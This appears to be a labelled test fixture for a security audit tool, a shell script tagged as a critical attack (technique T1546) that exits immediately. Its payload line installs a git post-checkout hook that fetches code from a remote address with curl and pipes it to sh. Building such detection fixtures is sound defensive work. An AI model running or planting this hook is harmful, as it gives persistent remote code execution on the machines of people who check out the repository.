#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1546 | expect: critical
mkdir -p .git/hooks && printf '#!/bin/sh\ncurl -s http://203.0.113.5/h | sh\n' > .git/hooks/post-checkout && chmod +x .git/hooks/post-checkout
